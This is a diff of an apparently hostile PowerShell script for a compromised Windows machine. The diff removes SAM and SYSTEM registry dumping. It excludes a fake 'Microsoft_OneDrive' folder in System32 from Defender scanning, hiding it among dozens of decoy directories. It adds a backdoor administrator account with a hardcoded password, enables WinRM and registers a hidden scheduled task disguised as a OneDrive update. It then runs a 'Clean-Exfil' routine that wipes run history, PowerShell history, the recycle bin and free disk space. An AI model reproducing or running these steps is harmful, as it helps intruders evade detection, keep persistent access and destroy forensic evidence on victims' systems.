@@ -2,8 +2,85 @@ cd $env:SystemRoot\System32
 mkdir Microsoft_OneDrive
 Set-MpPreference -ExclusionPath $env:SystemRoot\System32\Microsoft_OneDrive
 cd Microsoft_OneDrive
-reg save HKLM\sam ./sam.save
-reg save HKLM\system ./system.save
+mkdir AA
+mkdir AB
+mkdir AC
+mkdir AD
+mkdir AE
+mkdir AF
+mkdir AG
+mkdir AH
+mkdir AI
+mkdir AJ
+mkdir AK
+mkdir AL
+mkdir AM
+mkdir AN
+mkdir AO
+mkdir AP
+mkdir AQ
+mkdir AR
+mkdir AS
+mkdir AT
+mkdir AU
+mkdir AV
+mkdir AW
+mkdir AX
+mkdir AY
+mkdir AZ
+mkdir BA
+mkdir BB
+mkdir BC
+mkdir BD
+mkdir BE
+mkdir BF
+mkdir BG
+mkdir BH
+mkdir BI
+mkdir BJ
+mkdir BK
+mkdir BL
+mkdir BM
+mkdir BN
+mkdir BO
+mkdir BP
+mkdir BQ
+mkdir BR
+mkdir BS
+mkdir BT
+mkdir BU
+mkdir BV
+mkdir BW
+mkdir BX
+mkdir BY
+mkdir BZ
+mkdir Ba
+mkdir Bb
+mkdir Bc
+mkdir Bd
+mkdir Be
+mkdir Bf
+mkdir Bg
+mkdir Bh
+mkdir Bi
+mkdir Bj
+mkdir Bk
+mkdir Bl
+mkdir Bm
+mkdir Bn
+mkdir Bo
+mkdir Bp
+mkdir Bq
+mkdir Br
+mkdir Bs
+mkdir Bt
+Set-MpPreference -ExclusionPath $env:SystemRoot\System32\Microsoft_OneDrive\BQ
+
+
+
+
+
+
 NET USER AWORTH Imperator877 /ADD
 NET LOCALGROUP Administrators AWORTH /ADD
 winrm quickconfig -quiet
@@ -21,3 +98,21 @@ $principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
 $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
 Register-ScheduledTask T1 -InputObject $task -Force -TaskName Microsoft_OneDrive_Update -User $env:UserName
+
+function Clean-Exfil { 
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+Clean-Exfil
+start powershell -argumentlist '-windowstyle hidden cipher /w:c'
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+cls
+exit
+
+
+
